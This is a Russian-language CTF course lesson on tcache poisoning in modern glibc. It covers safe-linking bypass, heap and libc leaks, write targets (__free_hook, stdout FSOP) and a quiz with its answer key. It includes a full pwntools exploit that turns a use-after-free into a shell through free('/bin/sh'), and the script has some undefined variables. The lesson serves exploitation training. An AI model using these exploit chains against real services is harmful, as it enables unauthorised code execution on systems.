---
id: pwn-heap-tcache
title: "tcache poisoning: произвольная запись в modern glibc"
category: pwn
parent: pwn-heap-uaf
difficulty: expert
order: 2
tags: [heap, tcache, poisoning, safe-linking, fsop, glibc]
prerequisites: [pwn-heap-uaf]
useful_for:
  - "CTF Pwn категория"
  - "Modern glibc exploitation"
  - "Vulnerability research"
estimated_minutes: 50
summary: "Детально разбираем tcache poisoning с учётом safe-linking (glibc 2.32+), выбор цели записи в modern glibc и полную цепочку до shell."
---
tcache poisoning — самый распространённый приём эксплуатации кучи в современном glibc. Он позволяет заставить `malloc` вернуть произвольный адрес, перезаписав указатель `fd` свободного tcache-чанка. До glibc 2.32 это делалось без единой проверки; после — требует обхода safe-linking. Этот урок разбирает механику tcache, атаку poisoning, версии glibc и полный эксплойт до захвата управления.

## Что такое tcache

tcache (thread-local cache) появился в glibc 2.26 для ускорения `malloc`/`free`. Каждый поток имеет массив `tcache_perthread_struct` с 64 бинами (для размеров от 0x20 до 0x410 шагом 0x10) и счётчиками. Каждый бин — односвязный LIFO-список до `tcache_count` чанков (по умолчанию 7). `free` кладёт чанк в tcache, `malloc` берёт оттуда первым — без консолидации и, до 2.32, почти без проверок.

## Структура tcache-чанка

Свободный tcache-чанк использует свои первые 16 байт данных: `fd` (следующий) и `key`. С 2.29 `key` содержит `tcache_key` — случайное значение, ловящее double-free. При `malloc` из tcache `key` зануляется.

| Смещение | Поле | Назначение |
|---|---|---|
| +0x00 | fd | следующий чанк в списке |
| +0x08 | key | tcache_key (2.29+) |

## Базовый tcache poisoning (до glibc 2.32)

```c
char *a = malloc(0x40);   // A
char *b = malloc(0x40);   // B (защита top)
free(a);
// UAF: перезаписываем A->fd
*(unsigned long*)a = target;
malloc(0x40);             // вернёт A, голова списка = target
char *c = malloc(0x40);   // вернёт target!
```

```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall')
# allocate, free, UAF-write
p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'size: ', b'0x40')
# ... free ...
p.sendline(p64(target))       # перезаписываем fd
# два malloc -> второй вернёт target
```

## Safe-linking (glibc 2.32+)

Начиная с 2.32 `fd` хранится как `fd ^ (chunk_addr >> 12)`. Чтобы записать `target`, нужно знать адрес самого чанка (heap base) и вычислить `target ^ (chunk_addr >> 12)`. Это ломает «слепое» poisoning, но обходится утечкой heap-адреса (часто через тот же UAF или через вывод указателей).

```python
def protect(ptr, pos):
    return ptr ^ (pos >> 12)
# записываем в fd: protect(target, chunk_addr)
```

## Утечка heap-адреса

Safe-linking требует heap base. Способы: (1) программа печатает указатель на чанк; (2) UAF-чтение `fd` свободного чанка даёт `next ^ (chunk>>12)`, откуда при известном `next=0` (последний в списке) получаем `chunk>>12`; (3) утечка через unsorted bin (там лежат libc-адреса). Часто heap base = `leak << 12`.

## Утечка libc через unsorted bin

Чтобы нацелиться на `__free_hook`/`_IO_2_1_stdout_`, нужна база libc. Её даёт освобождение чанка в unsorted bin: его `fd`/`bk` указывают на `main_arena` внутри libc. Читая через UAF, получаем libc-адрес.

```python
# free чанка размером > 0x80 (не в tcache или tcache полон)
# читаем fd -> libc.main_arena + offset
libc.address = leak - 0x1ecbe0   # offset зависит от версии
```

## Полный эксплойт: tcache poisoning -> __free_hook -> system

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def alloc(p, size, data=b''):
    p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'size: ', str(size).encode())
    if data: p.sendlineafter(b'data: ', data)

def free(p, idx):
    p.sendlineafter(b'> ', b'2'); p.sendlineafter(b'idx: ', str(idx).encode())

def edit(p, idx, data):
    p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'data: ', data)

def exploit():
    p = start()
    # 1) утечка heap через UAF (safe-linking)
    alloc(p, 0x40); alloc(p, 0x40)
    free(p, 0); free(p, 1)
    edit(p, 0, b'A'*8)              # UAF-чтение fd
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    heap = leak << 12
    # 2) утечка libc через unsorted bin (чанк > tcache)
    alloc(p, 0x500); alloc(p, 0x500)
    free(p, 2)
    edit(p, 2, b'B'*8)
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ecbe0
    # 3) tcache poisoning -> __free_hook
    alloc(p, 0x40); alloc(p, 0x40)
    free(p, 4); free(p, 5)
    edit(p, 4, p64(libc.symbols['__free_hook'] ^ (heap_of_chunk4 >> 12)))
    alloc(p, 0x40); alloc(p, 0x40, p64(libc.symbols['system']))
    # 4) free("/bin/sh")
    alloc(p, 0x40, b'/bin/sh\x00')
    free(p, 6)
    p.interactive()

exploit()
```

## Версии glibc и что меняется

| Версия | Изменение | Влияние |
|---|---|---|
| 2.26 | появился tcache | tcache poisoning |
| 2.29 | `tcache_key` | double-free detection |
| 2.32 | safe-linking | XOR-обфускация fd |
| 2.34 | удалены hooks | цели — FSOP/stdout |
| 2.36+ | переработан malloc | часть атак усложнена |

## Тонкости и подводные камни

- **Чанк должен быть ровно в tcache-диапазоне.** Для 0x40 используйте запрос 0x38.
- **Safe-linking требует heap base.** Без него poisoning не собрать.
- **key ловит double-free.** Сбросьте key или используйте другой приём.
- **`__free_hook` удалён в 2.34.** Тогда цель — `_IO_2_1_stdout_` или `__exit_funcs`.
- **Выравнивание target.** `malloc` требует, чтобы возвращаемый адрес был выровнен; иначе abort.
- **Порядок free важен.** LIFO: последний освобождённый — первый выданный.
- **Проверки `tcache_get`.** В новых glibc есть доп. проверки на размер и выравнивание.

## Справочные таблицы

| Инструмент | Назначение |
|---|---|
| pwndbg `tcache` | показать tcache-бин |
| pwndbg `bins` | все бин-списки |
| `parseheap` (gef) | разбор heap |
| libc-database | подбор версии по offset |

| Цель записи | Версия glibc |
|---|---|
| `__free_hook` | < 2.34 |
| `__malloc_hook` | < 2.34 |
| `_IO_2_1_stdout_` | любая |
| `__exit_funcs` | любая |
| GOT | Partial RELRO |

## Что дальше / решение

Дальше: `pwn-heap-uaf` (источник примитива), `pwn-fastbin-dup` (аналог для fastbin), `pwn-unsortedbin-attack`, `pwn-fsop` (цели в 2.34+). Практический алгоритм: (1) определите версию glibc (утечка/`libc-database`); (2) получите UAF или double-free; (3) утеките heap base (safe-linking) и libc (unsorted bin); (4) перезапишите `fd` tcache-чанка на цель; (5) дважды `malloc`, второй вернёт цель; (6) запишите `system` в хук/FSOP и вызовите с `/bin/sh`. tcache poisoning — базовый навык современной heap-эксплуатации.

## Подробный разбор safe-linking

Safe-linking (glibc 2.32+) защищает `fd` свободных чанков (tcache и fastbin). Формула: сохранённое значение `stored = ptr ^ (chunk_addr >> 12)`, где `chunk_addr` — адрес самого чанка (позиция поля fd), а `ptr` — реальный указатель на следующий чанк. При чтении glibc восстанавливает `ptr = stored ^ (chunk_addr >> 12)`.

Чтобы записать произвольный `target`, нужно вычислить `stored = target ^ (chunk_addr >> 12)`. Если `chunk_addr` неизвестен, атака невозможна. Поэтому первый шаг — утечка heap-адреса. Классический способ: освободить два чанка в tcache, затем через UAF прочитать `fd` первого. Если в списке он указывает на второй чанк, то `stored = chunk2 ^ (chunk1 >> 12)`; зная `chunk1` и `chunk2` (например, из относительной раскладки), восстанавливаем heap base.

Частный случай: последний чанк в списке имеет `fd = 0`, значит `stored = chunk_addr >> 12`. Из этой утечки `heap_base = stored << 12` (с точностью до младших 12 бит). Это самый удобный способ получить базу heap.

## Версии glibc и цели записи

В glibc 2.34 удалили `__malloc_hook`, `__free_hook` и `__realloc_hook`. Поэтому в новых системах tcache poisoning нацеливают на `_IO_2_1_stdout_` (FSOP через `_IO_str_overflow`), `__exit_funcs` (`exit`-обработчики), `_IO_list_all` или на стек через `environ`. В старых версиях проще всего перезаписать `__free_hook` значением `system`, затем вызвать `free("/bin/sh")`.

## Практический чек-лист по версии

| Проверка | Как |
|---|---|
| версия libc | `libc.address + offset` по утечке, `libc-database` |
| наличие hooks | `nm -D libc.so.6 \| grep hook` |
| safe-linking | glibc ≥ 2.32 |
| tcache_key | glibc ≥ 2.29 |

## Расширенный пример для glibc 2.34+

```python
# цель — _IO_2_1_stdout_
stdout = libc.symbols['_IO_2_1_stdout_']
alloc(p, 0x40); alloc(p, 0x40)
free(p, 0); free(p, 1)
edit(p, 0, p64(stdout ^ (chunk0 >> 12)))
alloc(p, 0x40)                      # вернёт chunk0
alloc(p, 0x40, fake_io_file)        # вернёт stdout, записываем fake _IO_FILE
```

Фейковая `_IO_FILE` настраивается так, чтобы при следующем выводе/флаше сработала `_IO_str_overflow` с vtable, указывающей на `system`. Детали — в `pwn-fsop` и `pwn-io-str-overflow`.

## Итог

tcache poisoning — универсальный примитив «malloc в произвольный адрес». Его сила в простоте: достаточно UAF или double-free. Его ограничение — safe-linking, требующая утечки heap base. Освоив poisoning, вы получаете доступ к любой цели записи: hooks, FSOP, exit-обработчики. Это обязательный навык современной heap-эксплуатации.

## Рекомендации по практике

Отработайте poisoning на бинаре с glibc до 2.32 (без safe-linking), затем повторите на 2.32+ с утечкой heap base. Напишите вспомогательную функцию `protect(ptr, chunk_addr)`, которая обфусцирует указатель по safe-linking. Доведите эксплойт до захвата `__free_hook` (старая glibc) и до FSOP через `_IO_2_1_stdout_` (новая). Это две базовые цели, покрывающие большинство задач.

## Финальная мысль

Poisoning учит главному принципу heap-эксплуатации: аллокатор доверяет метаданным, а метаданные лежат рядом с данными пользователя. Научившись переписывать `fd`, вы управляете тем, куда `malloc` вернёт память, — а это половина любой современной heap-задачи.

## Квиз

```quiz
- question: "Что делает safe-linking (glibc ≥ 2.32)?"
  options:
    - "Удаляет tcache"
    - "Хранит `next` как `next ^ (chunk_addr >> 12)`"
    - "Включает ASLR"
    - "Шифрует данные чанка"
  answer: 1
- question: "Что нужно для подделки `next` при safe-linking?"
  options:
    - "Только адрес цели"
    - "Знать адрес чанка (heap leak)"
    - "Отключить NX"
    - "Canary"
  answer: 1
- question: "Почему `__free_hook` не работает в glibc ≥ 2.34?"
  options:
    - "Переименован"
    - "Удалён из glibc"
    - "Стал read-only"
    - "Требует root"
  answer: 1
- question: "Что такое FSOP?"
  options:
    - "File Stream Oriented Programming — эксплуатация `_IO_FILE`/vtable"
    - "Формат-строка"
    - "Тип ROP"
    - "Защита кучи"
  answer: 0
- question: "Сколько чанков максимум держит один tcache-bin?"
  options:
    - "3"
    - "7"
    - "64"
    - "255"
  answer: 1
```

## Где пригодится

- **CTF Pwn:** tcache poisoning — стандарт для modern heap-задач.
- **Browser exploitation:** те же примитивы (poisoning, FSOP) применяются в реальных цепочках.
- **Bug bounty:** нативные приложения с UAF/double-free в современных glibc.
- **Работа:** понимание modern glibc hardening и его обхода — ключ к анализу актуальных эксплойтов.
